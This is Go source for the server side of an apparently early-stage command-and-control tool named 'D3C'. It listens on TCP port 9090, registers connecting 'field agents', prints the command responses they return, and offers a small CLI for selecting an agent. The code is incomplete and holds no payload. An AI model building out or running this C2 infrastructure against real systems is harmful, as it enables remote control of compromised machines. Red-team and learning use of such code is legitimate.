package main

import (
	"bufio"
	"commons/commons"
	"encoding/gob"
	"log"
	"net"
	"os"
	"strings"
)

var (
	fieldAgents   = []commons.Message{}
	selectedAgent = ""
)

func main() {
	log.Println("Started Execution")
	go startListener("9090") // Start listener on port 9090 dettached from main thread

	cliHandler()
}

func cliHandler() {
	for {
		if selectedAgent != "" {
			print(selectedAgent + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)
		completeCommand, _ := reader.ReadString('\n')

		separatedCommand := strings.Split(strings.TrimSuffix(completeCommand, "\n"), " ")
		baseCommand := strings.TrimSpace(separatedCommand[0])

		if len(baseCommand) > 0 {
			switch baseCommand {
			//		case "show":
			//			showHandler(separatedCommand)
			case "select":
				selectHandler(separatedCommand)
			case "exit":
				os.Exit(0)
			default:
				log.Println("Typed command does not exist!")
			}
		}
	}
}

//func showHandler(command []string) {
//}

func selectHandler(command []string) {
	if len(command) > 1 {
		if agentIsRegistered(command[1]) {
			selectedAgent = command[1]
		} else {
			log.Println("Agent not registered")
			log.Println("To list field agents use the command: show agents")
		}
	} else {
		selectedAgent = ""
	}
}

func agentIsRegistered(agentId string) (registered bool) {
	registered = false

	for _, agent := range fieldAgents {
		if agent.AgentId == agentId {
			registered = true
			break
		}
	}
	return registered
}

func messageContainsResponse(message commons.Message) (containsResponse bool) {
	containsResponse = false

	for _, command := range message.Commands {
		if len(command.Response) > 0 {
			containsResponse = true
			break
		}
	}
	return containsResponse
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("Error starting listener: %v", err)
	} else {
		for {
			channel, err := listener.Accept()
			defer channel.Close()

			if err != nil {
				log.Fatalf("Error accepting connection: %v", err)
			} else {
				message := &commons.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Verify if the agent is already registered
				if agentIsRegistered(message.AgentId) {
					log.Println("Message from Agent: ", message.AgentId)
					if messageContainsResponse(*message) {
						// Print the response
						for _, command := range message.Commands {
							log.Println("Command: ", message.Commands)
							log.Println("Response: ", command.Response)
						}
					}
				} else {
					log.Println("Registering Agent: ", message.AgentId)
					fieldAgents = append(fieldAgents, *message)
				}
				gob.NewEncoder(channel).Encode(message)
			}

		}

	}
}
